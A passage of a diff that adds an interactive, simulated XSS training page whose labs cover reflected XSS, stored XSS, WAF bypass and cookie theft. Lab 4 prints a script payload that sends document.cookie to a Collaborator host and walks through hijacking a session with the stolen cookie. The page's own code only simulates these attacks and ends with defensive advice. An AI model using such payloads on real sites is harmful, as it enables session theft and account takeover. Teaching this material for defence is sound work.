+            <p>Cookies are accessible to JavaScript by design — legitimate site code often reads them. The <code>HttpOnly</code> flag prevents this, but many sites fail to set it. If a cookie lacks <code>HttpOnly</code>, XSS can steal it.</p>
+          </div>
+          <div class="sim-container">
+            <div class="sim-label">🖥️ BLOG COMMENT SIMULATION — Confirm Stored XSS</div>
+            <div class="fake-browser">
+              <div class="browser-bar">
+                <div class="browser-dots"><span></span><span></span><span></span></div>
+                <div class="browser-url">https://lab.web-security-academy.net/post?postId=3</div>
+              </div>
+              <div class="browser-body">
+                <div class="guestbook-form">
+                  <div class="gb-title">💬 Leave a Comment</div>
+                  <input type="text" class="sim-input" value="Attacker" readonly />
+                  <textarea class="sim-textarea" readonly>&lt;script&gt;alert(1)&lt;/script&gt;</textarea>
+                  <button class="sim-btn" onclick="lab4Confirm()">Post Comment</button>
+                </div>
+                <div id="l4-confirm-output"></div>
+              </div>
+            </div>
+          </div>
+          <div class="step-instruction">
+            <div class="instruction-number">→</div>
+            <div>Click <strong>Post Comment</strong> to confirm stored XSS. Then answer the question below.</div>
+          </div>
+          <div class="quiz-box" id="l4q1" style="display:none">
+            <div class="quiz-question">💬 Why is <code>HttpOnly</code> important for session cookies?</div>
+            <div class="quiz-options">
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">It forces the cookie to use HTTPS only</button>
+              <button class="quiz-btn correct" onclick="quizAnswer(this, true, 'l4s1', 'l4s2')">It prevents JavaScript from accessing the cookie — even if XSS exists, the session token can't be stolen</button>
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">It encrypts the cookie value</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="step locked" id="l4s2">
+        <div class="step-header">
+          <div class="step-number">02</div>
+          <div class="step-title">Set Up the Cookie Exfiltration Payload</div>
+          <div class="step-status">Locked</div>
+        </div>
+        <div class="step-body">
+          <div class="step-explanation">
+            <h3>🛰️ Burp Collaborator — Your Listening Server</h3>
+            <p>Burp Collaborator gives you a unique domain (e.g., <code>abc123.oastify.com</code>). Any HTTP request to that domain is logged and visible in Burp. This is called <strong>out-of-band (OOB) data exfiltration</strong>.</p>
+            <div class="code-block">
+              <div class="code-label">COOKIE STEALING PAYLOAD</div>
+              <pre>&lt;script&gt;
+fetch('https://YOUR-COLLABORATOR.oastify.com/?cookie=' + document.cookie);
+&lt;/script&gt;</pre>
+            </div>
+            <h3>🧠 How it works:</h3>
+            <ol class="steps-list">
+              <li><code>document.cookie</code> reads all cookies for the current domain</li>
+              <li><code>fetch()</code> sends an HTTP GET request to your Collaborator domain</li>
+              <li>The cookie value is appended to the URL as a parameter</li>
+              <li>Burp Collaborator logs the incoming request — including the URL with the cookie</li>
+              <li>You can see the victim's session token in Burp</li>
+            </ol>
+          </div>
+
+          <div class="sim-container">
+            <div class="sim-label">🛰️ PAYLOAD INJECTION + COLLABORATOR SIMULATION</div>
+            <div class="collab-sim">
+              <div class="collab-left">
+                <div class="fake-browser mini">
+                  <div class="browser-bar">
+                    <div class="browser-dots"><span></span><span></span><span></span></div>
+                    <div class="browser-url">blog/post?postId=3</div>
+                  </div>
+                  <div class="browser-body">
+                    <div class="guestbook-form compact">
+                      <textarea class="sim-textarea small" id="l4-payload-input">&lt;script&gt;fetch('https://collab.oastify.com/?c='+document.cookie)&lt;/script&gt;</textarea>
+                      <button class="sim-btn" onclick="lab4InjectPayload()">Inject Payload</button>
+                    </div>
+                    <div id="l4-inject-status"></div>
+                  </div>
+                </div>
+              </div>
+              <div class="collab-arrow">→</div>
+              <div class="collab-right">
+                <div class="collaborator-panel">
+                  <div class="collab-title">🛰️ Burp Collaborator</div>
+                  <div class="collab-empty" id="collab-panel">Waiting for interactions...</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="quiz-box" id="l4q2" style="display:none">
+            <div class="quiz-question">💬 Why use an external server (Collaborator) instead of logging to a file on the target?</div>
+            <div class="quiz-options">
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">Because the target server has better storage</button>
+              <button class="quiz-btn correct" onclick="quizAnswer(this, true, 'l4s2', 'l4s3')">We can't write files on the victim's server — out-of-band exfiltration sends data TO our controlled server</button>
+              <button class="quiz-btn wrong" onclick="quizAnswer(this, false)">It's faster than local storage</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="step locked" id="l4s3">
+        <div class="step-header">
+          <div class="step-number">03</div>
+          <div class="step-title">Session Hijacking — Use the Stolen Cookie</div>
+          <div class="step-status">Locked</div>
+        </div>
+        <div class="step-body">
+          <div class="step-explanation">
+            <h3>🔓 From Cookie to Account Access</h3>
+            <p>You've received the victim's session cookie. Now you impersonate them by sending an HTTP request with <em>their</em> cookie instead of yours. The server can't tell the difference — a valid session token is a valid session token.</p>
+          </div>
+
+          <div class="sim-container">
+            <div class="sim-label">🔧 BURP REPEATER SIMULATION — Session Hijacking</div>
+            <div class="repeater-sim">
+              <div class="repeater-request">
+                <div class="rep-label">REQUEST (Modified)</div>
+                <div class="repeater-code" id="repeater-code">
+GET /my-account HTTP/1.1
+Host: lab.web-security-academy.net
+Cookie: <span class="highlight-green" id="stolen-cookie-display">session=??? (steal first)</span>
+Connection: close</div>
+                <button class="sim-btn" onclick="lab4Hijack()" id="hijack-btn" disabled>Send Request</button>
+              </div>
+              <div class="repeater-response">
+                <div class="rep-label">RESPONSE</div>
+                <div id="repeater-response">Waiting...</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="attack-timeline" id="full-timeline" style="display:none">
+            <div class="timeline-title">🎯 Full Attack Chain — Complete</div>
+            <div class="timeline-item"><span class="tl-num">1</span><span>Identified stored XSS in blog comment section</span></div>
+            <div class="timeline-item"><span class="tl-num">2</span><span>Crafted <code>fetch()</code> payload targeting Burp Collaborator</span></div>
+            <div class="timeline-item"><span class="tl-num">3</span><span>Victim viewed the post → browser executed script silently</span></div>
+            <div class="timeline-item"><span class="tl-num">4</span><span>Session cookie arrived at Collaborator: <code>session=v1ct1m-s3ss10n</code></span></div>
+            <div class="timeline-item critical"><span class="tl-num">5</span><span>Replayed cookie in Repeater → logged in as victim. <strong>Lab Solved.</strong></span></div>
+          </div>
+
+          <div class="callout warning" id="final-callout" style="display:none">
+            <strong>Defense Summary:</strong> Set <code>HttpOnly</code> and <code>Secure</code> flags on session cookies. Implement Content-Security-Policy to restrict script sources. Sanitize ALL user input before storing. Encode ALL user data before rendering.
+          </div>
+
+          <div class="complete-step-btn" id="l4-complete-btn" style="display:none">
+            <button class="btn-primary" onclick="completeStep('l4s3', 'lab4')">🎉 Complete Lab 4 — XSS Academy Finished!</button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="module-footer">
+      <button class="btn-secondary" onclick="goToModule('lab3')">← Lab 3</button>
+    </div>
+  </div>
+
+  <!-- COMPLETION SCREEN -->
+  <div class="module" id="module-complete">
+    <div class="completion-screen">
+      <div class="completion-icon">🎓</div>
+      <h1>XSS Academy Complete!</h1>
+      <p class="completion-subtitle">You've completed all four labs. You now understand XSS from attacker's perspective.</p>
+      <div class="completion-badges">
+        <div class="completion-badge">🔍 Reflected XSS</div>
+        <div class="completion-badge">💾 Stored XSS</div>
+        <div class="completion-badge">🛡️ WAF Bypass</div>
+        <div class="completion-badge">🍪 Cookie Theft</div>
+      </div>
+      <div class="key-takeaways">
+        <h3>Key Takeaways</h3>
+        <ul>
+          <li>XSS works because browsers trust what servers send them</li>
+          <li>Stored XSS is the most dangerous — it affects all users automatically</li>
+          <li>WAFs can be bypassed with systematic enumeration, not random guessing</li>
+          <li>Session cookies without <code>HttpOnly</code> are stealable via XSS</li>
+          <li>The fix: validate input, encode output, set security headers</li>
+        </ul>
+      </div>
+      <button class="btn-primary" onclick="goToModule('concept')">↩ Review Concepts</button>
+    </div>
+  </div>
+
+</main>
+
+<!-- ALERT MODAL -->
+<div class="modal-overlay" id="alertModal" style="display:none">
+  <div class="modal">
+    <div class="modal-header">🌐 JavaScript Alert</div>
+    <div class="modal-body">
+      <div class="alert-icon">⚠️</div>
+      <div id="alert-message">1</div>
+    </div>
+    <button class="modal-btn" onclick="closeAlert()">OK</button>
+  </div>
+</div>
+
+<script>
+// ============================
+// XSS ACADEMY — SCRIPT.JS
+// ============================
+
+const completedLabs = new Set();
+const labNames = { lab1: 'Reflected XSS', lab2: 'Stored XSS', lab3: 'WAF Bypass', lab4: 'Cookie Theft' };
+let storedPosts = [];
+let stolenCookie = null;
+
+// ===== NAVIGATION =====
+function goToModule(id) {
+  document.querySelectorAll('.module').forEach(m => m.classList.remove('active'));
+  document.getElementById('module-' + id).classList.add('active');
+
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  const btn = document.querySelector(`[data-module="${id}"]`);
+  if (btn) btn.classList.add('active');
+
+  const labels = {
+    concept: 'XSS Academy › Concepts',
+    lab1: 'XSS Academy › Lab 1 — Reflected XSS',
+    lab2: 'XSS Academy › Lab 2 — Stored XSS',
+    lab3: 'XSS Academy › Lab 3 — WAF Bypass',
+    lab4: 'XSS Academy › Lab 4 — Cookie Theft',
+    complete: 'XSS Academy › 🎓 Complete!'
+  };
+  document.getElementById('breadcrumb').textContent = labels[id] || 'XSS Academy';
+  window.scrollTo(0, 0);
+}
+
+document.querySelectorAll('.nav-item').forEach(btn => {
+  btn.addEventListener('click', () => goToModule(btn.dataset.module));
+});
+
+document.getElementById('sidebarToggle')?.addEventListener('click', () => {
+  document.getElementById('sidebar').classList.toggle('open');
+});
+
+// ===== MODAL ALERT =====
+function showAlert(msg) {
+  document.getElementById('alert-message').textContent = msg;
+  document.getElementById('alertModal').style.display = 'flex';
+}
+
+function closeAlert() {
+  document.getElementById('alertModal').style.display = 'none';
+}
+
+// ===== QUIZ LOGIC =====
+function quizAnswer(btn, correct, currentStep, nextStep, specialAction) {
+  const box = btn.closest('.quiz-box');
+  box.querySelectorAll('.quiz-btn').forEach(b => {
+    b.disabled = true;
+    if (b === btn) {
+      b.classList.add(correct ? 'answer-correct' : 'answer-wrong');
+    }
+  });
+
+  if (correct) {
+    setTimeout(() => {
+      if (nextStep) unlockStep(nextStep);
+      if (currentStep) markStepDone(currentStep);
+      if (specialAction === 'lab2-complete') unlockStep('l2s2');
+    }, 600);
+  } else {
+    setTimeout(() => {
+      btn.classList.remove('answer-wrong');
+      btn.disabled = false;
+      box.querySelectorAll('.quiz-btn').forEach(b => b.disabled = false);
+    }, 1200);
+  }
+}
+
+function unlockStep(stepId) {
+  const el = document.getElementById(stepId);
+  if (!el) return;
+  el.classList.remove('locked');
+  el.classList.add('active');
+  el.querySelector('.step-body').style.display = 'block';
+  el.querySelector('.step-status').textContent = 'In Progress';
+  setTimeout(() => el.scrollIntoView({ behavior: 'smooth', block: 'start' }), 300);
+}
+
+function markStepDone(stepId) {
+  const el = document.getElementById(stepId);
+  if (!el) return;
+  const status = el.querySelector('.step-status');
+  if (status) { status.textContent = 'Complete ✓'; status.classList.add('done'); }
+}
+
+function completeStep(stepId, labId) {
+  markStepDone(stepId);
+  completeLab(labId);
+}
+
+function completeLab(labId) {
+  if (completedLabs.has(labId)) return;
+  completedLabs.add(labId);
+  updateProgress();
+
+  const badge = document.createElement('div');
+  badge.className = 'earned-badge';
+  badge.textContent = '✓ ' + labNames[labId];
+  document.getElementById('badgeArea').appendChild(badge);
+
+  if (completedLabs.size === 4) {
+    setTimeout(() => goToModule('complete'), 1200);
+  }
+}
+
+function updateProgress() {
+  const pct = (completedLabs.size / 4) * 100;
+  document.getElementById('progressBar').style.width = pct + '%';
+  document.getElementById('progressLabel').textContent = completedLabs.size + ' / 4 Labs';
+}
+
+// ===== TERMINAL ANIMATION =====
+function typeToTerminal(elementId, lines, delay = 60, callback) {
+  const el = document.getElementById(elementId);
+  el.style.display = 'block';
+  el.innerHTML = '';
+  let lineIdx = 0;
+  let charIdx = 0;
+
+  function typeChar() {
+    if (lineIdx >= lines.length) {
+      if (callback) setTimeout(callback, 400);
+      return;
+    }
+    const line = lines[lineIdx];
+    if (charIdx < line.length) {
+      el.innerHTML += line[charIdx];
+      charIdx++;
+      setTimeout(typeChar, delay);
+    } else {
+      el.innerHTML += '\n';
+      lineIdx++;
+      charIdx = 0;
+      setTimeout(typeChar, delay * 3);
+    }
+  }
+  typeChar();
+}
+
+// ===== LAB 1: REFLECTED XSS =====
+function lab1Search() {
+  const input = document.getElementById('l1-search-input').value.trim() || 'test';
+  const output = document.getElementById('l1-search-output');
+  output.style.color = 'var(--text2)';
+  output.innerHTML = `<span style="color:var(--text3)">You searched for:</span> <span style="color:#fff">${escapeHtml(input)}</span>`;
+
+  setTimeout(() => {
+    const quiz = document.getElementById('l1q1');
+    if (quiz) { quiz.style.display = 'block'; quiz.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); }
+  }, 700);
+}
+
+function lab1XSSTest() {
+  const rawInput = document.getElementById('l1-xss-input').value;
+  const output = document.getElementById('l1-xss-output');
+  const terminalId = 'l1-terminal';
+
+  // Show "raw" reflected HTML
+  output.innerHTML = `<span style="color:var(--text3)">Server response (raw HTML):</span><br><span style="color:var(--accent2)">${escapeHtml(rawInput)}</span>`;
+
+  const lines = [
+    '> Browser parsing server response...',
+    '> Found <script> tag in HTML output',
+    '> Executing JavaScript: alert(1)',
+    '> [XSS PAYLOAD EXECUTED] ✓',
+    '> ─────────────────────────────────',
+    '> VULNERABILITY CONFIRMED',
+    '> Type: Reflected XSS',
+    '> Severity: HIGH',
+  ];
+
+  typeToTerminal(terminalId, lines, 40, () => {
+    showAlert('XSS - Payload Executed! (Simulation)');
+    setTimeout(() => {
+      const quiz = document.getElementById('l1q2');
+      if (quiz) { quiz.style.display = 'block'; quiz.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); }
+    }, 500);
+  });
+}
+
+// ===== LAB 2: STORED XSS =====
+function gbPost() {
+  const name = document.getElementById('gb-name').value || 'Attacker';
+  const msg = document.getElementById('gb-message').value || '';
+  const postsEl = document.getElementById('gb-posts');
+
+  // Store the post (simulated DB)
+  storedPosts.push({ name, msg });
+
+  // Re-render all posts
+  renderGbPosts(postsEl);
+
+  // If XSS payload present, show execution
+  if (msg.toLowerCase().includes('<script>') || msg.toLowerCase().includes('alert')) {
+    setTimeout(() => {
+      showAlert("XSS - Stored payload executing! (Every visitor gets this)");
+      setTimeout(() => {
+        const quiz = document.getElementById('l2q1');
+        if (quiz) { quiz.style.display = 'block'; quiz.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); }
+      }, 500);
+    }, 600);
+  }
+}
+
+function renderGbPosts(container) {
+  container.innerHTML = storedPosts.map((p, i) => `
+    <div class="guestbook-post">
+      <div class="gb-post-name">${escapeHtml(p.name)}</div>
+      <div class="gb-post-msg">${escapeHtml(p.msg)}</div>
+    </div>
+  `).join('');
+}
+
+// ===== LAB 3: WAF BYPASS =====
+function lab3Test() {
+  const output = document.getElementById('l3-output');
+  output.style.color = 'var(--accent)';
+  output.innerHTML = `
+    <div style="margin-bottom:6px"><span style="color:var(--text3)">HTTP/1.1</span> <span style="color:var(--accent);font-weight:700">400 Bad Request</span></div>
+    <div style="color:var(--text3);font-size:11px">X-WAF-Action: BLOCK</div>
+    <div style="color:var(--text3);font-size:11px">X-WAF-Rule: XSS-SIGNATURE-img-onerror</div>
+    <div style="color:var(--accent2);font-size:12px;margin-top:8px">⛔ Payload blocked by Web Application Firewall</div>
+  `;
+  setTimeout(() => {
+    const quiz = document.getElementById('l3q1');
+    if (quiz) { quiz.style.display = 'block'; quiz.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); }
+  }, 600);
+}
+
+const tagPayloads = [
+  { tag: 'script', status: '400', result: 'BLOCKED' },
+  { tag: 'img', status: '400', result: 'BLOCKED' },
+  { tag: 'svg', status: '400', result: 'BLOCKED' },
+  { tag: 'iframe', status: '400', result: 'BLOCKED' },
+  { tag: 'input', status: '400', result: 'BLOCKED' },
+  { tag: 'details', status: '400', result: 'BLOCKED' },
+  { tag: 'video', status: '400', result: 'BLOCKED' },
+  { tag: 'body', status: '200', result: 'ALLOWED ✓' },
+  { tag: 'marquee', status: '400', result: 'BLOCKED' },
+  { tag: 'object', status: '400', result: 'BLOCKED' },
+];
+
+const attrPayloads = [
+  { attr: 'onclick', status: '400', result: 'BLOCKED' },
+  { attr: 'onerror', status: '400', result: 'BLOCKED' },
+  { attr: 'onmouseover', status: '400', result: 'BLOCKED' },
+  { attr: 'onfocus', status: '400', result: 'BLOCKED' },
+  { attr: 'onload', status: '400', result: 'BLOCKED' },
+  { attr: 'onresize', status: '200', result: 'ALLOWED ✓' },
+  { attr: 'onchange', status: '400', result: 'BLOCKED' },
+  { attr: 'onkeyup', status: '400', result: 'BLOCKED' },
+];
+
+function runIntruderTags() {
+  const results = document.getElementById('intruder-tag-results');
+  const status = document.getElementById('intruder-tag-status');
+
+  results.innerHTML = `<div class="result-header"><span>Payload (Tag)</span><span>Status</span><span>Result</span></div>`;
+  status.textContent = 'Running...';
+  status.style.color = 'var(--yellow)';
+
+  let i = 0;
+  function addRow() {
+    if (i >= tagPayloads.length) {
+      status.textContent = 'Done — 1 allowed tag found';
+      status.style.color = 'var(--green)';
+      setTimeout(() => {
+        const quiz = document.getElementById('l3q2');
+        if (quiz) { quiz.style.display = 'block'; quiz.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); }
+      }, 400);
+      return;
+    }
+    const p = tagPayloads[i];
+    const row = document.createElement('div');
+    row.className = 'result-row ' + (p.status === '200' ? 'allowed' : (i < 3 ? 'dim' : 'blocked'));
+    row.innerHTML = `<span>&lt;${p.tag}&gt;</span><span>${p.status}</span><span>${p.result}</span>`;
+    results.appendChild(row);
+    results.scrollTop = results.scrollHeight;
+    i++;
+    setTimeout(addRow, 120);
+  }
+  addRow();
+}
+
+function runIntruderAttribs() {
+  const results = document.getElementById('intruder-attr-results');
+  const status = document.getElementById('intruder-attr-status');
+
+  results.innerHTML = `<div class="result-header"><span>Payload (Attribute)</span><span>Status</span><span>Result</span></div>`;
+  status.textContent = 'Running...';
+  status.style.color = 'var(--yellow)';
+
+  let i = 0;
+  function addRow() {
+    if (i >= attrPayloads.length) {
+      status.textContent = 'Done — onresize allowed!';
+      status.style.color = 'var(--green)';
+      setTimeout(() => {
+        const quiz = document.getElementById('l3q3');
+        if (quiz) { quiz.style.display = 'block'; quiz.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); }
+      }, 400);
+      return;
+    }
+    const p = attrPayloads[i];
+    const row = document.createElement('div');
+    row.className = 'result-row ' + (p.status === '200' ? 'allowed' : 'blocked');
+    row.innerHTML = `<span>${p.attr}</span><span>${p.status}</span><span>${p.result}</span>`;
+    results.appendChild(row);
+    results.scrollTop = results.scrollHeight;
+    i++;
+    setTimeout(addRow, 150);
+  }
+  addRow();
+}
+
+// ===== LAB 4: COOKIE STEALING =====
+function lab4Confirm() {
+  const out = document.getElementById('l4-confirm-output');
+  out.innerHTML = `
+    <div class="guestbook-post">
+      <div class="gb-post-name" style="color:var(--accent2)">Attacker</div>
+      <div class="gb-post-msg">&lt;script&gt;alert(1)&lt;/script&gt;</div>
+    </div>
+  `;
+  setTimeout(() => {
+    showAlert('XSS - Stored payload confirmed!');
+    setTimeout(() => {
+      const quiz = document.getElementById('l4q1');
+      if (quiz) { quiz.style.display = 'block'; quiz.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); }
+    }, 500);
+  }, 500);
+}
+
+function lab4InjectPayload() {
+  const statusEl = document.getElementById('l4-inject-status');
+  const collabPanel = document.getElementById('collab-panel');
+
+  statusEl.innerHTML = `<div style="color:var(--green);font-family:var(--font-mono);font-size:11px;margin-top:8px">✓ Payload stored in database</div>`;
+
+  // Simulate victim loading the page
+  setTimeout(() => {
+    statusEl.innerHTML += `<div style="color:var(--yellow);font-family:var(--font-mono);font-size:11px;margin-top:4px">⚡ Victim user viewed the post...</div>`;
+  }, 1200);
+
+  setTimeout(() => {
+    statusEl.innerHTML += `<div style="color:var(--accent2);font-family:var(--font-mono);font-size:11px;margin-top:4px">🍪 Payload executing in victim browser...</div>`;
+  }, 2400);
+
+  // Cookie arrives at Collaborator
+  setTimeout(() => {
+    stolenCookie = 'v1ct1mS3ss10nT0k3nXXXYYYZZZ';
+    collabPanel.innerHTML = `
+      <div class="collab-hit">
+        ✅ DNS Interaction received<br>
+        ✅ HTTP Interaction received<br><br>
+        GET /?cookie=session=${stolenCookie} HTTP/1.1<br>
+        Host: collab.oastify.com<br>
+        User-Agent: Mozilla/5.0 (victim)<br><br>
+        <span style="color:var(--accent2)">🍪 COOKIE CAPTURED: session=${stolenCookie}</span>
+      </div>
+    `;
+
+    // Enable repeater
+    document.getElementById('stolen-cookie-display').textContent = `session=${stolenCookie}`;
+    document.getElementById('stolen-cookie-display').style.color = 'var(--green)';
+    document.getElementById('hijack-btn').disabled = false;
+
+    setTimeout(() => {
+      const quiz = document.getElementById('l4q2');
+      if (quiz) { quiz.style.display = 'block'; quiz.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); }
+    }, 600);
+  }, 3800);
+}
+
+function lab4Hijack() {
+  if (!stolenCookie) return;
+  const resp = document.getElementById('repeater-response');
+
+  resp.innerHTML = `<span style="color:var(--yellow)">Sending request...</span>`;
+
+  setTimeout(() => {
+    resp.innerHTML = `
+      <span style="color:var(--green)">HTTP/1.1 200 OK</span>
+      <br>Content-Type: text/html
+      <br><br>
+      <span style="color:var(--green2)">Welcome back, <strong>victim-user</strong>!</span>
+      <br><span style="color:var(--text2);font-size:10px">Your account has been loaded using the stolen session token.</span>
+      <br><br><span style="color:var(--accent2)">⚠ SESSION HIJACKED SUCCESSFULLY</span>
+    `;
+
+    document.getElementById('full-timeline').style.display = 'block';
+    document.getElementById('final-callout').style.display = 'block';
+    document.getElementById('l4-complete-btn').style.display = 'block';
+
+    setTimeout(() => document.getElementById('full-timeline').scrollIntoView({ behavior: 'smooth' }), 400);
+  }, 1500);
+}
+
+// ===== UTILITY =====
+function escapeHtml(str) {
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+
+// Close modal on overlay click
+document.getElementById('alertModal').addEventListener('click', function(e) {
+  if (e.target === this) closeAlert();
+});
+
+// Initialize
+goToModule('concept');
+
+</script>
+</body>
+</html>
